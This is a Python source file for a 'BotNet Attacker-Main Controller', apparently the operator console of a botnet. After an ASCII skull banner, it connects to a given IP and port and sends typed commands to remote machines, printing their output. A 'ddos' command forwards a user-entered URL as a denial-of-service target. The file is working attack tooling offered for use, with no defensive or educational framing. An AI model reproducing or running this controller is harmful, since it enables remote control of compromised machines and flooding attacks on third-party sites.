import socket, readline, os, subprocess,argparse,multiprocessing,platform,sys,time
from colorama import Fore,init
from colorama import Back as bg
from multiprocessing import Process
parser = argparse.ArgumentParser(description='BotNet Attacker-Main Controller')
parser.add_argument('-ip','--attackerip',metavar='',help='')
parser.add_argument('-p','--port',metavar='',help='')
args = parser.parse_args()
init(autoreset=True)
class Controller(object):
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
    @staticmethod
    def show_banner(s):
        for c in s + '\n':
            sys.stdout.write(bg.BLACK + Fore.GREEN + c)
            sys.stdout.flush()
            time.sleep(2. / 100)
        time.sleep(1.5)
        print('-----------------------------------------------------------------')
        print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By AL104 & Droid')
        print("Github:https://github.com/FonderElite")
        print("Github:https://github.com/abalesluke")
        print('-----------------------------------------------------------------')


    def listen(self):
        try:
            server_ip = self.ip
            server_port = self.port
            buffer_values = lambda buff1,buff2 : buff1 * buff2
            buffer_size = buffer_values(10240,1024)
            SEPARATOR = "<sep>"
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip,int(server_port)))
            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]checking connection...")
            time.sleep(1)
            print(f"connecting to {server_ip}:{server_port}...")
            print('connected!\n')
            while True:
                try:
                    host = socket.gethostname()
                    cmd = input(f'{host}~# ')
                    if cmd == 'gg':
                        s.send('gg'.encode())
                        print(s.recv(1024).decode())
                    elif cmd == 'ddos':
                        s.send(cmd.encode())
                        ui = input('enter url: ')
                        s.send(ui.encode())
                    elif cmd == 'clear':
                        os.system('clear')
                    elif cmd == 'exit':
                        s.send('close'.encode())
                        s.close()
                        exit(0)
                    else:
                        s.send(cmd.encode())
                        print(s.recv(1024).decode())
                except KeyboardInterrupt:
                    s.send('close'.encode())
                    s.close()
                    exit(0)
        except Exception:
            print('python3 <file-name.py> -h for help')


if __name__ == "__main__":
    main_class = Controller(args.attackerip,args.port)
    banner = Process(target=main_class.show_banner,args=('''
     _,-ddd888888bbb-._
   d88888888888888888888b     
 d888888888888888888888888b
6888888888888888888888888889
68888b8""8q8888888p8""8d88889
`d8887     p88888q     4888b'
 `d8887    p88888q    4888b'
   `d887   p88888q   488b'
     `d8bod8888888dob8b'
       `d88888888888d'
         `d8888888b' 
           `d8888b' `
             `bd'
    ''',)) 
    banner.start()
    banner.join()
    main_class.listen()
